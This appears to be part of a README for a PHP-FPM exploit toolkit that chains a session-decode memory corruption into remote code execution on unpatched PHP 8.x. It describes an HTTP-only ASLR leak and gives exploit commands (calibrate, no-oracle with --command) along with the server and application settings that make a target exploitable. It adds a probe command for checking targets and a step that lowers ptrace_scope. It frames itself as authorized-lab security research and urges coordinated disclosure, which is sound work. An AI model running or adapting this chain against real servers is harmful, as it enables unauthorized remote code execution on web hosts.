This is arbitrary **session-file write** pre-auth, not RCE by itself: core
PHP serializes the filename with correct lengths, the `php` serializer
rejects keys containing `|` (so the key cannot smuggle objects), and the
files handler validates the session id (`php_session_valid_key`, only
`[a-zA-Z0-9,-]`), which rules out path traversal. Turning the plant into code
execution needs an application gadget or a local file include in the target —
which is why PHP <= 7.x is reported as *session plant* while every 8.x
release (8.0 and up) gets the RCE chain, verified end to end.

## HTTP-only base leak

The leak is the part that removes the ASLR oracle from the exploit path:

1. `bigvar.php` stores `k0..k3` before a 4 MB tail, so the producer OOM leaves
   dangling zval pointers in the stale var_hash.
2. The producer is fired; the 4 MB tail triggers the OOM.
3. A later multipart request reclaims a freed 16 KB slot with a forged
   `zend_string` header. Its length (`0x15810`) spans the stale zval array
   (chunk pointer) and the `execute_ex` handler table (PIE pointer).
4. `app.php` reflects `r`; the client dechunks the body, extracts `r\t`, and
   reads the two pointers at fixed offsets.
5. The client validates alignment and expected address ranges, subtracts the
   profile's `chunk_base_off` and `pie_base_off` for the build, and retries
   if the worker answered late or died mid-read.

The read is retried because the worker can abort after answering. A failed leak
is not necessarily a broken lab; re-run `leak` or use `--chunk/--pie` if the
bases are known.

## Testing

### Unit tests

```sh
python3 -m unittest discover -s tests -v
```

The suite covers multipart encoding, chunked-body decoding, leak geometry,
profile consistency, schema validation, and the exact forged payload layout.
The live tests are skipped unless the lab is up and `PHP2SHELL_FPM_LAB=1` is
set.

### Live lab tests

```sh
PHP2SHELL_FPM_LAB=1 python3 -m unittest \
  tests.test_fpm.FpmLabIntegrationTests -v
```

This runs `primitive`, `endgame`, and `no-oracle` against
`127.0.0.1:8110/8111`. `endgame` needs `ptrace_scope=0`; `no-oracle` does not.

### Syntax and lint

```sh
python3 -m compileall -q tools tests
bash -n lab/fpm/build_php.sh lab/fpm/build_nginx.sh
ruff check tools tests
```

### Manual smoke test

```sh
python3 tools/php2shell_fpm_labs.py smoke
```

### Make targets

```sh
make test       # unit suite
make lint       # ruff
make validate   # profile against schema
make ci         # lint + test + validate
make matrix     # verify every unpatched build over HTTP
make readme      # regenerate the README profile table after calibrating
```

The profile table in [Profile and offsets](#profile-and-offsets) is generated
from `profiles/*-fpm.json` by `tools/readme_table.py`; the unit suite fails if
it drifts from the shipped profiles (`--check` prints the difference).

### Verifying the whole unpatched matrix

```sh
make matrix                                        # every unpatched branch
python3 tools/php2shell_fpm_matrix.py 7.4.33 8.3.35   # just these
```

For each version the runner starts its own lab, calibrates the profile over
HTTP when it is not verified yet, runs the remote endgame, and prints one
line per version. Patched releases are skipped: they cannot RCE by design.
A single version is verified with the two commands below (the ports come from
`php2shell_fpm_labs.py builds_map`):

```sh
python3 tools/php2shell_fpm_labs.py up --only 8.3.35
python3 tools/php2shell_fpm.py --version 8.3.35 \
  --base http://127.0.0.1:8478 --builder http://127.0.0.1:8479 \
  calibrate          # discovers leak + reclaim geometry, writes the profile
python3 tools/php2shell_fpm.py --version 8.3.35 \
  --base http://127.0.0.1:8478 --builder http://127.0.0.1:8479 \
  --command 'id>out/p1' --proof-file out/p1 no-oracle
```

For PHP <= 7.x use `poison` instead: `calibrate` and `no-oracle` refuse those
builds.

## CI/CD

GitHub Actions is configured in `.github/workflows/`:

- **`ci.yml`** — on every push and pull request:
  - Python 3.11, 3.12, and 3.13 matrix;
  - installs `requirements-dev.txt` (`jsonschema`, `ruff`);
  - runs `ruff check tools tests`;
  - compiles Python and checks shell syntax;
  - runs the unit suite with schema validation.
- **`live-fpm.yml`** — manual `workflow_dispatch`:
  - matrix over every verified profile (8.2.34, 8.3.35, 8.4.0, 8.4.25, 8.4.26);
  - installs build dependencies and builds nginx/PHP from source;
  - starts the matching local lab;
  - enables `ptrace_scope=0` for the oracle test;
  - runs the full live suite and tears the lab down.
- **`release.yml`** — on `v*` tags:
  - publishes a GitHub Release with generated release notes.

The live workflow is manual because a PHP source build is too heavy and too
environment-sensitive for every push. The fast CI validates the client,
profile, payload layout, and scripts without building PHP.

## Troubleshooting

### `consumer status=502` and no proof

`502` after the fire is normal: the worker was killed by the fake destructor.
Check the proof file (`curl http://127.0.0.1:8110/out/p1`). If it is missing,
look at `lab/fpm/runtime/php-8.4.26/logs/` and retry. A mismatch moves the
worker to the other heap slot and the next candidate.

### `HTTP leak failed (all reads short or invalid)`

The worker may have died between the leak read and the response, or the heap
layout may have shifted. Retry `leak`; the state is re-armed each run. If you
already know the bases, pass `--chunk` and `--pie`. For the local lab only,
`no-oracle --allow-local-fallback` permits the `/proc/<pid>/maps` fallback;
remote targets should retry or provide the bases.

### `no php-fpm 'chain' worker`

The lab is not running, or the worker died and has not respawned. Check
`python3 tools/php2shell_fpm_labs.py status`, then start or restart it.

### `ptrace_scope` or oracle errors

`endgame` and `primitive` use `/proc/<pid>/mem`. Set:

```sh
sudo sysctl -w kernel.yama.ptrace_scope=0
```

Use `no-oracle` if you do not want to change the setting.

### Ports already in use

```sh
python3 tools/php2shell_fpm_labs.py down
python3 tools/php2shell_fpm_labs.py up --only 8.4.26
```

### `command too long`

The fake `zend_string` carrier limits the command to **87 bytes** with no NUL.
Use a short command, or stage a longer script separately in an authorized lab.

### Missing build tools

`build_php.sh` and `build_nginx.sh` print the failing command. Install
`build-essential`, `curl`, and `tar`; add `libxml2-dev` if PHP configure asks
for it.

### Schema test skipped

Install the development dependency:

```sh
python3 -m pip install -r requirements-dev.txt
```

### `Primary script unknown` / nginx 404

The nginx root is the repository's `lab/fpm/webroot`. Re-run
`python3 tools/php2shell_fpm_labs.py up` so nginx and FPM configs are rendered
with the current paths. Do not move the webroot independently of the launcher.

## Security model, remote scope, and limitations

### What "100% remote" means here

The `no-oracle` path is **100% remote for the supported configuration below**:
every interaction with the target is an HTTP request to the chain and builder
surfaces. It does not read `/proc/<pid>/mem`, does not need a local shell or the
FPM PID, and executes the command in the target worker. The HTTP stale-string
leak recovers the ASLR bases.

If the HTTP leak fails, `no-oracle` stops; it does **not** silently read local
`/proc`. The `/proc/<pid>/maps` fallback is opt-in with
`--allow-local-fallback` and is only for the lab. On a remote target, retry the
leak or provide the bases with `--chunk/--pie`. This is remote code execution,
not a generic unauthenticated scanner.

### Configurations this PoC covers without code changes

- **Any vulnerable 8.x release (8.0 - 8.4.26, 8.5.0 - 8.5.11), amd64,
  nginx + PHP-FPM.** Verified profiles are in `profiles/<version>-fpm.json`;
  the fix landed in 8.2.35, 8.3.36, 8.4.27, and 8.5.12, and the 8.0/8.1
  branches were never patched. A build without a profile is covered after one
  `calibrate` run against it.
- **A stock installation shape (default mode):** ONE pool, ONE port,
  `memory_limit=128M`, `pm=dynamic` with any number of workers,
  `post_max_size=8M`, `session.upload_progress.cleanup=On`,
  `session.lazy_write` in either state, `session.serialize_handler=php`,
  `session.save_handler=files`. The front must pass ~5 MB bodies (nginx
  `client_max_body_size 5m` - the stock `1m` is too small to push 128M over
  with the amplifier; Apache has no such default cap). Every worker is armed
  and the consume fans out over the pool, so no worker pinning and no
  `pm.max_requests` concern apply.
- **Two HTTP surfaces with different memory limits (classic builder mode,
  `--arm-mode builder`):** a consumer pool low enough that decoding the 4 MB
  session OOMs after RINIT, and a builder surface high enough to persist the
  4 MB arm. This can be two FPM pools on one host - including behind a single
  port with `--builder-prefix` - or two hosts sharing the session directory.
  `session.upload_progress.cleanup=Off` on the builder, or an application-level
  session write, keeps the arm alive between requests.
- **An application operation that calls `session_start()`** and lets the
  session decode after RINIT. `lab/fpm/webroot/app.php` is the stand-in.
- **An arm operation**: an endpoint that feeds attacker-controlled data to
  `session_decode()` (the amplifier, `grow.php`), or one that appends
  attacker data to the session (the growth fallback), or - in classic mode -
  an arm equivalent to `bigvar.php` where small session keys are pushed onto
  the unserialize var_hash before a 4 MB tail triggers the OOM.
- **A reference-bearing session equivalent to `ref.php`**: the application can
  store a reference in the session, so the serialized session contains `R:N`;
  that is the hook the forged `var_hash` redirects.
- **`session.use_strict_mode=0`**, or an existing attacker-known session ID
  accepted by the application, and no session-ID regeneration between the arm
  and the fire. Strict mode or regeneration can break the chain before it
  starts.
- **A reflection/read channel for the leaked `r` value.** `app.php` provides
  it for the lab. Without it, `leak` cannot recover ASLR remotely; `no-oracle`
  then needs known `--chunk/--pie` values.
- **An HTTP-reachable proof path**, or another authorized exfiltration channel.
  `out/p1` and `/out/` are lab conveniences, not a requirement of the memory
  corruption itself. The command is limited to 87 bytes with no NUL.

Run `python3 tools/php2shell_fpm.py --base <url> --version <v> probe` to
check every row of that list against a specific target.

### Configurations that need adaptation or do not work

- PHP 8.4.27, PHP 8.5.x, or another PHP version/architecture without a
  matching profile. The bug may still be relevant elsewhere, but the shipped
  offsets and heap geometry are only verified for 8.0.30, 8.1.33, 8.2.34,
  8.3.35, 8.4.0, 8.4.25 and 8.4.26 on amd64 — run `calibrate` for the rest.
- nginx with the stock `client_max_body_size 1m` against a stock
  `memory_limit=128M`: too little request body crosses the decode OOM (the
  amplifier needs ~5 MB). Raise the body cap, or use classic mode with a
  consumer pool whose `memory_limit` is low enough.
- A single low-memory pool in classic builder mode: the 4 MB arm kills the
  consumer before the trigger. Default mode (amplifier) is the fix.
- Redis/Memcached/custom session handlers, `php_serialize`, or session storage
  that is not shared between the arm and consume surfaces.
- No application session-start operation, no arm operation (amplifier or
  growth), no session reflection/read channel with unknown bases, or no
  reference-bearing session.
- Apache `mod_php`, CGI, CLI, or non-FPM SAPIs. This is an FPM chain.
- Interactive shells or persistence. The command is one-shot, the carrier is
  87 bytes, and the consumer worker aborts after `zif_system`; FPM respawns it.
  A `502` is the expected side effect.

### Operational limits

- **Authorized labs only.** The chain is destructive to workers and allocates
  large bodies. Do not point it at third-party infrastructure.
- **Leak reliability.** The OOB read can race worker death; the client retries.
  The bases remain stable for the FPM master lifetime.
- **Local oracle modes.** `endgame` and `primitive` read `/proc/<pid>/mem` and
  need `kernel.yama.ptrace_scope=0`; `no-oracle` does not.

This is a concrete, verified PoC, not a claim that every PHP-FPM deployment
is exploitable with no adaptation. The underlying bug may affect more
configurations than this client covers.

## FAQ

**Does it work on a default nginx + PHP-FPM installation?**<br>
Yes, with one caveat on each side. Server side: a stock php.ini
(`memory_limit=128M`, `post_max_size=8M`, `cleanup=On`, default session
settings, `pm=dynamic`) and one nginx line — `client_max_body_size 5m` or
more (nginx's stock `1m` cannot carry enough body to cross 128M; Apache has
no such default cap). One port, one pool, any worker count. Application
side: the session operations of
[Default-installation mode](#default-installation-mode) — `session_start()`,
a stored reference, a reflected session value, and an endpoint that either
feeds `session_decode()` or appends to the session. Run `probe` to get the
exact checklist for a target; the two-pool builder mode remains as the
fallback when the application lacks the arm operation.

**Is this a remote pre-auth exploit?**<br>
It is 100% remote in the supported model: all target interaction is HTTP and
`no-oracle` does not read `/proc`. It is not pre-auth or universal: it requires
the application operations, two surfaces, and session configuration listed in
[Security model, remote scope, and limitations](#security-model-remote-scope-and-limitations).
The included lab is loopback-only.

**Why is the proof a `502`?**<br>
The command runs during session shutdown, then the fake destructor chain kills
the worker. The proof is the command's output file, not the HTTP status.

**Why two HTTP ports?**<br>
The 4 MB arm must go to the 64 MB builder pool. Sending it to the 8 MB consumer
pool kills the worker too early.

**Why no Docker?**<br>
The oracle needs host `/proc/<pid>/mem` and worker PIDs. Docker would require
`--pid=host` plus `SYS_PTRACE`, or running the client inside the container.
The user-prefix lab is simpler, rootless, and matches the upstream FPM lab.

**Does it work on PHP 8.4.27?**<br>
No. `PHP_RINIT(basic)` clears the stale state before the window; `patchcheck`
shows the fixed build as clean.

**Does it work on PHP 8.5.x?**<br>
8.5.12 carries the fix. The chain does not depend on the branch —
`calibrate` derives the geometry of any 8.0+ build over HTTP — but no 8.5
profile ships yet, so run `calibrate` against your build first.

**Can I set the bases manually?**<br>
Yes:

```sh
python3 tools/php2shell_fpm.py ... --chunk 0x7f4f48800000 --pie 0x55d75fc00000 no-oracle
```

**Does the leak need `/proc`?**<br>
No. The default `leak`/`no-oracle` path is HTTP-only; `no-oracle` refuses the
local fallback unless you explicitly pass `--allow-local-fallback` (lab-only).

## Legal and responsible use

This is security research tooling. You may use it only when you own the target
or have explicit, written permission from its owner, and when your testing
complies with the law and any applicable program rules. A public website, an IP
address found online, or a domain that looks like a lab is **not**
authorization.

Do not use this repository to build target lists, mass-exploitation tooling, or
to attack third-party infrastructure. Do not publish data obtained from systems
you do not own. Prefer coordinated disclosure with the PHP security team and
the affected distribution vendor.

The software is provided **as is**, without warranty. See [LICENSE](LICENSE).

## Credits

Original research and the Apache/FPM chains:
[`devploit/php2shell`](https://github.com/devploit/php2shell). This repository
is the FPM-only extraction and laboratory. Licensed under MIT; see
[LICENSE](LICENSE).
